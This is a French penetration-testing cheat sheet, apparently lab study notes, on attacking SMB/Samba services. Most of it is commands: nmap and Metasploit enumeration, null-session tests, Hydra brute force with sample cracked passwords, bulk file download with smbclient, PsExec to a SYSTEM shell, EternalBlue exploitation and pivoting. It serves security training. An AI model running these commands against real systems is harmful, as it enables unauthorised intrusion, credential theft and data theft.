# ðŸ“ Ã‰numÃ©ration SMB/Samba

[â† Retour Ã  la table des matiÃ¨res](../README.md)

## ðŸ“‹ Table des MatiÃ¨res
- [Nmap Scripts SMB](#nmap-scripts-smb)
- [Sessions Anonymes et Guest](#sessions-anonymes-et-accÃ¨s-guest)
- [Enum4linux](#enum4linux)
- [Bruteforce avec Hydra](#hydra-bruteforce)
- [Samba sur Linux](#samba-sur-linux)
- [CrackMapExec](#crackmapexec---Ã©numÃ©ration-des-shares)
- [Connexion aux Shares](#connexion-aux-shares)
- [MÃ©thodologie ComplÃ¨te](#mÃ©thodologie-dattaque-smb-complÃ¨te)
- [PsExec](#smb-avec-psexec)
- [MS17-010 EternalBlue](#ms17-010-eternalblue)
- [Versions SMB et SÃ©curitÃ©](#versions-smb-et-sÃ©curitÃ©)

## Port par dÃ©faut : 445

## Nmap Scripts SMB

### Scripts d'Ã©numÃ©ration de base
```bash
# Identification des protocoles SMB supportÃ©s
nmap -p445 --script smb-protocols targetIP

# Analyse du niveau de sÃ©curitÃ© SMB
nmap -p445 --script smb-security-mode targetIP

# Ã‰numÃ©ration des sessions actives
nmap -p445 --script smb-enum-sessions targetIP

# Ã‰numÃ©ration des partages disponibles
nmap -p445 --script smb-enum-shares targetIP

# DÃ©couverte de l'OS via SMB
nmap --script smb-os-discovery.nse -p 445 targetIP

# Ã‰numÃ©ration des utilisateurs (nÃ©cessite souvent des credentials)
nmap -p445 --script smb-enum-users.nse targetIP
```

### Scan complet avec dÃ©tection de version
```bash
# Ã‰numÃ©ration complÃ¨te des services SMB/NetBIOS
nmap -sV -p 139,445 targetIP
```

## Metasploit Modules
```bash
use scanner/smb/smb_enumusers
use scanner/smb/smb_login
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_version
```

## Sessions anonymes et accÃ¨s guest

### Test d'accÃ¨s anonyme
```bash
# Liste des partages en mode anonyme
smbclient -L targetIP -N

# Connexion RPC anonyme
rpcclient -U "" -N targetIP

# Test d'accÃ¨s guest (appuyer sur EntrÃ©e pour le mot de passe)
smbclient -L targetIP
```

### VÃ©rification des sessions nulles
Les sessions nulles permettent l'accÃ¨s anonyme aux ressources SMB. Configuration dangereuse mais parfois prÃ©sente sur les systÃ¨mes mal configurÃ©s.

```bash
# Test de connexion avec utilisateur vide
smbclient //targetIP/IPC$ -U ""
```

## Enum4linux
```bash
enum4linux -a targetIP
```

## Hydra Bruteforce â†’ [ðŸ“– Guide Hydra](../06-tools/hydra.md)
```bash
# Bruteforce SMB
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

## Samba sur Linux

### Ã‰numÃ©ration avec smbmap
```bash
# Ã‰numÃ©ration des shares avec credentials
smbmap -H targetIP -u username -p password

# Ã‰numÃ©ration anonyme
smbmap -H targetIP -u anonymous
```

### Bruteforce Samba avec Hydra
```bash
# Bruteforce spÃ©cifique pour Samba Linux
hydra -L users.txt -P passwords.txt targetIP smb
# âš ï¸ RÃ©duire les threads si nÃ©cessaire : -t 3
```

## CrackMapExec - Ã‰numÃ©ration des shares â†’ [ðŸ“– Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# VÃ©rifier les permissions des shares avec des credentials
crackmapexec smb targetIP -u administrator -p password --shares
```

## Connexion aux shares â†’ [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion au share C$ (nÃ©cessite des privilÃ¨ges admin)
smbclient //targetIP/C$ -U administrator

# Connexion Ã  un share spÃ©cifique
smbclient //targetIP/sharename -U username
```

## MÃ©thodologie d'attaque SMB complÃ¨te

### Ã‰tape 1 : Bruteforce initial â†’ [ðŸ“– Guide Hydra](../06-tools/hydra.md)
```bash
# DÃ©couverte des credentials avec Hydra
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt smb://targetIP
```

**RÃ©sultats typiques :**
```
[445][smb] host: targetIP   login: rooty   password: spongebob
[445][smb] host: targetIP   login: demo   password: password1
[445][smb] host: targetIP   login: auditor   password: hellokitty
[445][smb] host: targetIP   login: administrator   password: pineapple
```

### Ã‰tape 2 : Ã‰numÃ©ration des shares par utilisateur â†’ [ðŸ“– Guide CrackMapExec](../06-tools/crackmapexec.md)
```bash
# Tester chaque credential trouvÃ© pour lister les shares
crackmapexec smb targetIP -u rooty -p spongebob --shares
crackmapexec smb targetIP -u demo -p password1 --shares
crackmapexec smb targetIP -u auditor -p hellokitty --shares
crackmapexec smb targetIP -u administrator -p pineapple --shares
```

### Ã‰tape 3 : Connexion et exploration â†’ [ðŸ“– Guide SMBClient](../06-tools/smbclient.md)
```bash
# Connexion avec le compte ayant le plus de privilÃ¨ges (gÃ©nÃ©ralement administrator)
smbclient //targetIP/C$ -U administrator

# Si C$ n'est pas accessible, tester d'autres shares dÃ©couverts
smbclient //targetIP/Users -U username
smbclient //targetIP/shared -U username
```

### Ã‰tape 4 : Commandes dans smbclient
```bash
# Une fois connectÃ© au share SMB :
ls                    # Lister les fichiers
cd directory         # Changer de rÃ©pertoire
get filename         # TÃ©lÃ©charger un fichier
put localfile        # Upload un fichier
mget *.txt          # TÃ©lÃ©charger plusieurs fichiers
recurse ON          # Activer la rÃ©cursion
prompt OFF          # DÃ©sactiver les confirmations
mget *              # TÃ©lÃ©charger tout rÃ©cursivement
```

## Analyse des permissions

### InterprÃ©tation des rÃ©sultats CrackMapExec
```bash
# Exemple de sortie crackmapexec --shares :
# ADMIN$    Disk      Remote Admin           READ,WRITE
# C$        Disk      Default share          READ,WRITE  
# IPC$      IPC       Remote IPC             READ
# Users     Disk      Users Directory        READ
```

**LÃ©gende des permissions :**
- `READ` : Lecture seule
- `WRITE` : Ã‰criture possible
- `READ,WRITE` : AccÃ¨s complet
- `NO ACCESS` : Aucun accÃ¨s

### PrioritÃ©s d'exploration
1. **C$** : AccÃ¨s au systÃ¨me de fichiers complet (admin requis)
2. **ADMIN$** : RÃ©pertoire Windows/System32 (admin requis)  
3. **Users** : RÃ©pertoires utilisateurs (souvent accessible)
4. **Shares personnalisÃ©s** : Peuvent contenir des donnÃ©es sensibles

## Script de bruteforce des shares
```bash
#!/bin/bash
TARGET="targetIP"
WORDLIST="/root/Desktop/wordlists/shares.txt"

if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```

## SMB avec PsExec (nÃ©cessite des credentials lÃ©gitimes)

### Test de login SMB
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password
run
```

### PsExec avec Impacket
```bash
# ExÃ©cution directe
psexec.py administrator@targetIP cmd.exe
```

### PsExec avec Metasploit
```bash
use exploit/windows/smb/psexec
set RHOSTS targetIP
set SMBUser administrator
set SMBPass password1  # Utiliser le mot de passe dÃ©couvert
exploit
# Obtention d'un meterpreter avec privilÃ¨ges SYSTEM
```

**Fonctionnement de PsExec :**
- Utilise des credentials d'administrateur valides pour l'exÃ©cution de code
- Similaire Ã  l'utilitaire SysInternals PsExec
- CrÃ©e un service avec nom et description alÃ©atoires
- Nettoyage automatique aprÃ¨s exploitation
- RÃ©sultat : Session Meterpreter avec privilÃ¨ges NT AUTHORITY\SYSTEM

## MS17-010 EternalBlue

### DÃ©tection de la vulnÃ©rabilitÃ©
```bash
# Nmap script de dÃ©tection
nmap -sV -p 445 --script=smb-vuln-ms17-010 targetIP

# Scanner Metasploit
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS targetIP
run
```

### Exploitation EternalBlue
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS targetIP
run
```

## AccÃ¨s aux RÃ©seaux Internes via SMB

Une fois que tu as compromis une machine avec SMB, tu peux accÃ©der aux rÃ©seaux internes.

**â†’ [ðŸ“– Guide Complet du Pivoting](../05-post-exploitation/pivoting-metasploit.md)**

### Commandes rapides pour l'accÃ¨s rÃ©seau
```bash
# Migration vers processus utilisateur (si nÃ©cessaire)
migrate -N explorer.exe

# Test d'accÃ¨s aux ressources internes
shell
net view IP_CIBLE_INTERNE

# Mappage de lecteurs rÃ©seau
net use D: \\IP_CIBLE_INTERNE\Documents
net use K: \\IP_CIBLE_INTERNE\C$
```

## Versions SMB et SÃ©curitÃ©

### Analyse des versions SMB
```bash
# Identification des protocoles supportÃ©s
nmap -p445 --script smb-protocols targetIP
```

### Contexte sÃ©curitaire des versions SMB

#### SMBv1 (ExtrÃªmement dangereux)
- **DÃ©veloppÃ©** : AnnÃ©es 1980 (plus de 30 ans)
- **VulnÃ©rabilitÃ©s** : ExploitÃ© par WannaCry et autres ransomwares
- **Manques de sÃ©curitÃ©** :
  - Pas d'intÃ©gritÃ© prÃ©-authentification
  - NÃ©gociation de dialecte non sÃ©curisÃ©e
  - Pas de chiffrement
  - Connexions guest non sÃ©curisÃ©es
- **Recommandation** : DÃ©sactiver impÃ©rativement

#### SMBv2/SMBv3 (Versions modernes)
- **Protections** : Chiffrement, intÃ©gritÃ© prÃ©-authentification
- **SÃ©curitÃ©** : NÃ©gociation sÃ©curisÃ©e, dÃ©sactivation des connexions guest dangereuses
- **Versions** : SMB 2.0, 2.1, 3.0, 3.0.2, 3.1.1

### Configuration et dÃ©sactivation SMB
Les versions SMB peuvent Ãªtre activÃ©es/dÃ©sactivÃ©es via les registres Windows. SMBv1 reste prÃ©sent mÃªme sur les OS rÃ©cents mais peut Ãªtre dÃ©sactivÃ©.